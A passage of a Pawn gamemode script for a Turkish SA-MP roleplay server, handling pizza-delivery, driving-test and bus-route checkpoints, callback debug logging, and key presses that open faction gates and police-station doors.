		    SetPlayerCheckpoint(playerid, 1910.0862,-1131.8966,24.4222, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 4)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 6;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2133.1372,-1224.7881,23.6752, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 6)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 7;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2490.1184,-1146.3718,37.9162, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 7)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 8;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2447.2485,-1321.8202,23.6800, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 8)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 9;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2580.3684,-1043.9351,69.2690, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 9)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 10;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2035.7169,-1078.4159,24.4705, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 10)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 11;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 1194.0868,-1035.7229,31.6136, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 11)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 12;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 642.5463,-1621.2793,14.9702, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 12)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 13;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 758.1219,-1700.6935,4.8530, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 13)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 14;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 1764.1337,-2108.9753,13.2377, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 14)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 15;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 1893.1100,-1928.4103,13.2410, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 15)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 1;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 970.5221,-814.5997,97.2134, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	if(!GetPVarInt(playerid, "ParkCP") && ehliyetcp[playerid] != 0 && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid])
	{
		switch(ehliyetcp[playerid])
		{
			case 50:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 51;
		    	SetPlayerCheckpoint(playerid, 1961.2079,-1930.1903,13.1099, 10.0);
			}
			case 51:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 52;
		    	SetPlayerCheckpoint(playerid, 1825.9834,-1929.9594,13.1080, 10.0);
			}
	  		case 52:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 53;
		    	SetPlayerCheckpoint(playerid, 1823.8556,-1753.9427,13.1099, 10.0);
			}
			case 53:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 54;
		    	SetPlayerCheckpoint(playerid, 1806.4634,-1729.5936,13.1177, 10.0);
			}
			case 54:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 55;
		    	SetPlayerCheckpoint(playerid, 1533.2981,-1729.5039,13.1099, 10.0);
			}
			case 55:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 56;
		    	SetPlayerCheckpoint(playerid, 1524.4696,-1590.6469,13.1119, 10.0);
			}
			case 56:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 57;
		    	SetPlayerCheckpoint(playerid, 1425.1208,-1583.3281,13.1505, 10.0);
			}
			case 57:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 58;
		    	SetPlayerCheckpoint(playerid, 1455.6981,-1443.6598,13.1185, 10.0);
			}
			case 58:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 59;
		    	SetPlayerCheckpoint(playerid, 1367.3510,-1398.0392,13.1282, 10.0);
			}
			case 59:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 60;
		    	SetPlayerCheckpoint(playerid, 1311.7382,-1855.7924,13.1500, 10.0);
			}
			case 60:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 61;
		    	SetPlayerCheckpoint(playerid, 1685.8112,-1863.7742,13.1818, 10.0);
			}
			case 61:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 62;
		    	SetPlayerCheckpoint(playerid, 1693.1400,-1815.4968,13.1119, 10.0);
			}
			case 62:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 63;
		    	SetPlayerCheckpoint(playerid, 1824.9047,-1832.1954,13.1411, 10.0);
			}
			case 63:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 64;
		    	SetPlayerCheckpoint(playerid, 1855.5892,-1832.2351,13.3057, 10.0);
			}
			case 64:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 65;
		    	SetPlayerCheckpoint(playerid, 1859.5687,-1876.9443,13.1975, 10.0);
			}
			case 65:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 66;
		    	SetPlayerCheckpoint(playerid, 1955.1196,-1882.4178,13.1730, 10.0);
			}
			case 66:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 67;
		    	SetPlayerCheckpoint(playerid, 1975.2059,-1887.8904,13.2739, 10.0);
			}
			case 67:
			{
				DisablePlayerCheckpoint(playerid);
			    ehliyetcp[playerid] = 68;
		    	SetPlayerCheckpoint(playerid, 2068.0239,-1923.0956,13.2740, 10.0);
			}
			case 68:
			{
			    new Float:vh;
				GetVehicleHealth(GetPlayerVehicleID(playerid), vh);
	    		if(vh > 950)
	    		{
	    		    Bilgi(playerid, "Baþarýyla direksiyon testini geçip, ehliyet aldýnýz.");
					//Karakter[playerid][ehliyet] = 1;
					Karakter[playerid][ehliyet] = 1;
					/*Ipucu(playerid, "Temiz belgesi ve saðlýk raporu ile birlikte polis departmanýna giderek ehliyetinizi alabilirsiniz.");
					Ipucu(playerid, "Temiz belgesini LSPD'den, saðlýk raporunu ASGH'den alabilirsiniz.");*/
	    		}
	    		else
	    		{
	    		    Hata(playerid, "Direksiyon testini geçemediniz.");
	    		}
	   			DisablePlayerCheckpoint(playerid);
	   			ehliyetcp[playerid] = 0;
				CancelDrivingTest(playerid);
				KarakterKaydet(playerid);
			}
		}
	}
	if(Karakter[playerid][pCheckpoint] != 0 && otobuste[playerid] && !SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !ehliyetcp[playerid])
	{
		switch(Karakter[playerid][pCheckpoint])
		{
			case 10:
			{
			    if(GetPlayerVehicleSeat(playerid) != 0)
			    {
					SetPlayerPos(playerid, Veriler[otobusX], Veriler[otobusY], Veriler[otobusZ]);
	    			Bilgi(playerid, "Otobüs seferini iptal ettiniz.");
				    DisablePlayerCheckpoint(playerid);
					Karakter[playerid][pCheckpoint] = 0;
					otobuste[playerid] = 0;
			    }
		    	Karakter[playerid][pCheckpoint] = 11;
				SetPlayerCheckpoint(playerid, 1409.5773,-1875.9420,13.3828, 7.5);
			}
	    	case 11:
			{
		    	Karakter[playerid][pCheckpoint] = 12;
				SetPlayerCheckpoint(playerid, 1691.5851,-1828.2117,13.3828, 7.5);
			}
			case 12:
			{
			    Karakter[playerid][pCheckpoint] = 13;
				SetPlayerCheckpoint(playerid, 1693.4762,-1608.2343,13.3828, 7.5);
			}
			case 13:
			{
			    DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 14;
				SetPlayerCheckpoint(playerid, 1660.3060,-1451.5775,13.3857, 7.5);
			}
		 	case 14:
			{
			    DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 15;
				SetPlayerCheckpoint(playerid, 1610.9738,-1314.0459,17.2844, 7.5);
			}
	   	    case 15:
			{
			    DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 16;
				SetPlayerCheckpoint(playerid, 1457.7997,-1249.5205,13.3894, 7.5);
			}
			case 16:
			{
	 			DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 17;
				SetPlayerCheckpoint(playerid, 1184.2164,-1277.5380,13.2963, 7.5);
			}
	   	 	case 17:
			{
	  			DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 18;
				SetPlayerCheckpoint(playerid, 1054.9652,-1307.5519,13.4312, 7.5);
			}
			case 18:
			{
	  			DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 19;
		    	SetPlayerCheckpoint(playerid, 930.1986,-1392.2120,13.2808, 7.5);
			}
			case 19:
			{
				DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 20;
		    	SetPlayerCheckpoint(playerid, 650.1116,-1392.0341,13.4865, 7.5);
			}
			case 20:
			{
				DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 21;
		    	SetPlayerCheckpoint(playerid, 501.6518,-1446.6338,15.1400, 7.5);
			}
			case 21:
			{
				DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 22;
		    	SetPlayerCheckpoint(playerid, 740.4276,-1589.2476,14.2265, 7.5);
			}
			case 22:
			{
				DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 23;
		    	SetPlayerCheckpoint(playerid, 1026.4648,-1574.4507,13.3828, 7.5);
			}
			case 23:
			{
				DisablePlayerCheckpoint(playerid);
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnfreezeTimer", 8000, 0, "i", playerid);
				Bilgi(playerid, "Lütfen bekleyiniz.");
			    Karakter[playerid][pCheckpoint] = 24;
		    	SetPlayerCheckpoint(playerid, 1138.3776,-1715.6753,13.7293, 7.5);
			}
			case 24:
			{
			    new vid = GetPlayerVehicleID(playerid);
			    MotoruKapat(vid);
				Aractamiri(vid);
				SetPlayerPos(playerid, Veriler[otobusX],Veriler[otobusY],Veriler[otobusZ]);
	    		SetVehicleToRespawn(vid);
	    		new ucret = floatround(400*UstalikKatSayi(playerid));
	    		new mstring[64];
	    		format(mstring, sizeof(mstring), "Otobüs seferini baþarýyla bitirdiniz, %d$ kazandýnýz.",ucret);
	    		Bilgi(playerid, mstring);
	    		GivePlayerCash(playerid, ucret);
	   			DisablePlayerCheckpoint(playerid);
	   			Karakter[playerid][pCheckpoint] = 0;
				otobuste[playerid] = 0;
			}
		}
	}
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	if(Debug) printf("OnPlayerLeaveCheckpoint(%d)",playerid);
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
    if(Debug) printf("OnPlayerEnterRaceCheckpoint(%d)",playerid);
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
    if(Debug) printf("OnPlayerLeaveRaceCheckpoint(%d)",playerid);
	return 1;
}

public OnRconCommand(cmd[])
{
    if(Debug) printf("OnRconCommand(%s)",cmd);
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
    if(IsPlayerNPC(playerid)) return 1;
    if(Debug) printf("OnPlayerRequestSpawn(%d)",playerid);
	return 1;
}

public OnObjectMoved(objectid)
{
    if(Debug) printf("OnObjectMoved(%d)",objectid);
   	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
    if(Debug) printf("OnPlayerObjectMoved(%d, %d)",playerid,objectid);
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
    if(Debug) printf("OnPlayerPickUpPickup(%d, %d)",playerid, pickupid);
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
    if(Debug) printf("OnVehicleMod(%d, %d, %d)",playerid, vehicleid, componentid);
	return 0;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
    if(Debug) printf("OnVehiclePaintjob(%d, %d, %d)",playerid, vehicleid, paintjobid);
	return 0;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
    if(Debug) printf("OnVehicleRespray(%d, %d, %d, %d)",playerid, vehicleid, color1, color2);
	return 0;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
    if(Debug) printf("OnPlayerSelectedMenuRow(%d, %d)",playerid, row);
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
    if(Debug) printf("OnPlayerExitedMenu(%d)",playerid);
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
    if(Debug) printf("OnPlayerInteriorChange(%d, %d, %d)",playerid, newinteriorid, oldinteriorid);
	if(oldinteriorid != 0) StopAudioStreamForPlayer(playerid);
	new hour,minute,second;
	gettime(hour,minute,second);
	if(newinteriorid == 0) SetPlayerWeather(playerid,ServerWeather); SetPlayerTime(playerid, hour, 0);
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    if(IsPlayerNPC(playerid)) return 1;
    if(Debug) printf("OnPlayerKeyStateChange(%d, %d, %d)",playerid, newkeys, oldkeys);
    /*if(PRESSED(KEY_SECONDARY_ATTACK))
	{
		if(SprunkYaninda(playerid) && GetPlayerAnimationIndex(playerid) == 1660)
		{
			ClearAnimations(playerid);
			new Float:_hp;
			GetPlayerHealth(playerid, _hp);
			SetPlayerHealth(playerid, _hp);
			SetPlayerCash(playerid, GetPlayerCash(playerid));
		}
	}*/
	if(PRESSED(KEY_JUMP) && !IsPlayerInAnyVehicle(playerid) && Girdi[playerid])
	{
	    bunnyhop[playerid]++;
	    if(bunnyhop[playerid] > 2 && Karakter[playerid][adminlevel] < 1)
	    {
	        DONDUR(playerid);
	        COZ(playerid);
	    }
	}
	if(PRESSED(KEY_CTRL_BACK) || PRESSED(KEY_CROUCH))
	{
	    for(new id;id<MAX_GATE;id++)
		{
			if(!IsPlayerInAnyVehicle(playerid))
			{
				if(IsPlayerInRangeOfPoint(playerid, 3, Gate[id][gx],Gate[id][gy],Gate[id][gz]))
				{
				    if(Gate[id][gsahip] == Karakter[playerid][sqlid] || Gate[id][gbirlik] == Karakter[playerid][birlik] || Karakter[playerid][adminlevel] >= 1)
				    {
					    switch(Gate[id][gdurum])
					    {
							case 0:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gox], Gate[id][goy], Gate[id][goz], 1.6, Gate[id][gorx], Gate[id][gory], Gate[id][gorz]);
							    Gate[id][gdurum] = 1;
							}
							case 1:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gx], Gate[id][gy], Gate[id][gz], 1.6, Gate[id][grx], Gate[id][gry], Gate[id][grz]);
							    Gate[id][gdurum] = 0;
							}
					    }
					}
				}
			}
			else
			{
			    if(IsPlayerInRangeOfPoint(playerid, 15, Gate[id][gx],Gate[id][gy],Gate[id][gz]))
				{
				    if(Gate[id][gsahip] == Karakter[playerid][sqlid] || Gate[id][gbirlik] == Karakter[playerid][birlik] || Karakter[playerid][adminlevel] >= 1)
				    {
					    switch(Gate[id][gdurum])
					    {
							case 0:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gox], Gate[id][goy], Gate[id][goz], 1.6, Gate[id][gorx], Gate[id][gory], Gate[id][gorz]);
							    Gate[id][gdurum] = 1;
							}
							case 1:
							{
							    MoveDynamicObject(Gate[id][gobje], Gate[id][gx], Gate[id][gy], Gate[id][gz], 1.6, Gate[id][grx], Gate[id][gry], Gate[id][grz]);
							    Gate[id][gdurum] = 0;
							}
					    }
					}
				}
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
		{
			if(IsPlayerInRangeOfPoint(playerid, 15.0, 774,-1330.19995,12.7)) switch(SanTVGates[0][1])
			{
				case 0:
				{
					MoveDynamicObject(SanTVGates[0][0] ,765.2000, -1330.2000, 12.7000, 1.0);
					SanTVGates[0][1] = 1;
					PlayerPlaySoundEx(1035, 774,-1330.19995,12.7);
				}
				case 1:
				{
					MoveDynamicObject(SanTVGates[0][0],774.0000000,-1330.1999500,12.7000000, 1.0);
					SanTVGates[0][1] = 0;
					PlayerPlaySoundEx(1035, 774,-1330.19995,12.7);
				}
			}
			else if(IsPlayerInRangeOfPoint(playerid, 15.0, 782.29999,-1384.90002,12.9)) switch (SanTVGates[1][1])
			{
				case 0:
				{
					MoveDynamicObject(SanTVGates[1][0] ,773.8000, -1384.9000, 12.9000, 1.0);
					SanTVGates[1][1] = 1;
					PlayerPlaySoundEx(1035, 782.29999,-1384.90002,12.9);
				}
				case 1:
				{
					MoveDynamicObject(SanTVGates[1][0],782.2999900,-1384.9000200,12.9000000, 1.0);
					SanTVGates[1][1] = 0;
					PlayerPlaySoundEx(1035, 782.29999,-1384.90002,12.9);
				}
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Karakter[playerid][adminlevel] >= 1)
		{
			if(IsPlayerInRangeOfPoint(playerid, 15.0, 1544.2952,-1627.2408,13.3828))
			{
				MoveDynamicObject(LSPDObjs[0][0],1544.68,-1630.91,13.0231, 3.5, 0,-0.099967,-89.8357); //commander north
				LSPDObjs[0][2] = 1;
				PlayerPlaySoundEx(1083, 232.899703, 109.074996, 1009.211791);
				SetTimerEx("ShutUp",4000,false,"d",0);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 275.750000, 117.399414, 1003.617187))
			{
				MoveDynamicObject(LSPDObjs[1][0],275.75000000,120.89941406,1003.61718750, 3.5); // interrogation north
				MoveDynamicObject(LSPDObjs[1][1],275.75000000,118.89941406,1003.61718750, 3.5); // interrogation south
				LSPDObjs[1][2] = 1;
				PlayerPlaySoundEx(1083, 275.750000, 117.399414, 1003.617187);
				SetTimerEx("ShutUp",4000,false,"d",1);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 253.201660, 109.099609, 1002.220703))
			{
				MoveDynamicObject(LSPDObjs[2][0],253.20410156,105.59960938,1002.22070312,3.5); // north west lobby door
				MoveDynamicObject(LSPDObjs[2][1],253.19921875,112.59960938,1002.22070312,3.5); // north east lobby door
				LSPDObjs[2][2] = 1;
				PlayerPlaySoundEx(1083, 253.201660, 109.099609, 1002.220703);
				SetTimerEx("ShutUp",4000,false,"d",2);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 239.566894, 117.599609, 1002.220703))
			{
				MoveDynamicObject(LSPDObjs[3][0],239.56933594,114.09960938,1002.22070312,3.5); // south west lobby door
				MoveDynamicObject(LSPDObjs[3][1],239.56445312,121.09960938,1002.22070312,3.5); // south east lobby door
				LSPDObjs[3][2] = 1;
				PlayerPlaySoundEx(1083, 239.566894, 117.599609, 1002.220703);
				SetTimerEx("ShutUp",4000,false,"d",3);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 2.0, 265.951171, 115.826660, 1003.622863))
			{
				MoveDynamicObject(LSPDObjs[4][0],263.45,115.82421875,1003.62286377,3.5); // cam room
				MoveDynamicObject(LSPDObjs[4][1],268.75,115.82910156,1003.62286377, 3.5); // cam room
				LSPDObjs[4][2] = 1;
				PlayerPlaySoundEx(1083, 265.951171, 115.826660, 1003.622863);
				SetTimerEx("ShutUp",4000,false,"d",4);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 2.0, 265.820007, 112.530761, 1003.622863))
			{
				MoveDynamicObject(LSPDObjs[5][0],268.8,112.53222656,1003.62286377, 3.5); // locker
				MoveDynamicObject(LSPDObjs[5][1],263.3,112.52929688,1003.62286377, 3.5); // locker
				LSPDObjs[5][2] = 1;
				PlayerPlaySoundEx(1083, 265.820007, 112.530761, 1003.622863);
				SetTimerEx("ShutUp",4000,false,"d",5);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 231.099609, 119.532226, 1009.224426)) // Chief of Police
			{
				MoveDynamicObject(LSPDObjs[6][0],227.0,119.52929688,1009.22442627, 3.5);
				MoveDynamicObject(LSPDObjs[6][1],229.75,119.53515625,1009.22442627, 3.5);
				LSPDObjs[6][2] = 1;
				PlayerPlaySoundEx(1083, 231.099609, 119.532226, 1009.224426);
				SetTimerEx("ShutUp",4000,false,"d",6);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 217.800003, 116.529647, 998.015625)) // Cells
			{
				MoveDynamicObject(LSPDObjs[7][0],220.5,116.52999878,998.01562500,3.5);
				MoveDynamicObject(LSPDObjs[7][1],215.3,116.52929688,998.01562500,3.5);
				LSPDObjs[7][2] = 1;
				PlayerPlaySoundEx(1083, 217.800003, 116.529647, 998.015625);
				SetTimerEx("ShutUp",4000,false,"d",7);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 15, 2720.22, -2405.38, 14.22))
	        {
				if(!kapi[0][1])
				{
					MoveDynamicObject(kapi[0][0], 2719.9004000,-2409.5996000,12.5000000, 5.0);
					kapi[0][1] = true;
				}
				else
				{
					MoveDynamicObject(kapi[0][0], 2720.12012, -2401.25684, 12.50000, 5.0);
					kapi[0][1] = false;
				}
	        }
	        else if(IsPlayerInRangeOfPoint(playerid, 15, 2720.2151, -2504.0979, 14.2159))
	        {
				if(!kapi[1][1])
				{
					MoveDynamicObject(kapi[1][0], 2720.00000, -2508.30005, 12.50000, 5.0);
					kapi[1][1] = true;
				}
				else
				{
					MoveDynamicObject(kapi[1][0], 2720.06299, -2499.72754, 12.50000, 5.0);
					kapi[1][1] = false;
				}
	        }
	        else if(IsPlayerInRangeOfPoint(playerid, 7, 1588.53,-1637.98,14.98))
		    {
				if(lspdgaraj[1])
				{
					MoveStroyObject( lspdgaraj[0], 1588.53,-1637.98,14.98,2.00);
					lspdgaraj[1] = 0;
				}
				else
				{
					MoveStroyObject( lspdgaraj[0], 1596.73,-1637.98,14.98,2.00);
					lspdgaraj[1] = 1;
				}
		    }
		    else if(IsPlayerInRangeOfPoint(playerid, 3, 1034.594, 2603.353, 703.745))
		    {
		        if(lspdkapi[1])
		        {
		            MoveStroyObject( lspdkapi[0], 1034.59399, 2603.35303, 703.74500, 2.00);
		            lspdkapi[0] = 0;
				}
				else
				{
				    MoveStroyObject( lspdkapi[0], 1034.614, 2603.373, 700.650, 2.00);
				    lspdkapi[0] = 1;
				}
			}
			/*else if(PlayerToPoint(7, playerid, 1544.69,-1630.89,13.08))
	        {
				if(lspdcubuk[1])
				{
					SetDynamicObjectRot( lspdcubuk[0], 1.00,90.00,90.00);
					lspdcubuk[1] = 0;
				}
				else
				{
					SetDynamicObjectRot( lspdcubuk[0], 0.00,0.00,0.00);
					lspdcubuk[1] = 1;
				}
	        }*/
			else if(PlayerToPoint(2.0, playerid,199.8965,103.4586,958.6868))
			{
			    if(lspdkodes[0] == 0)
			    {
					MoveStroyObject(lspdkodes[0],198.6165,103.4586,958.6868,2.0);
					lspdkodes[0] = 1;
				}
				else
				{
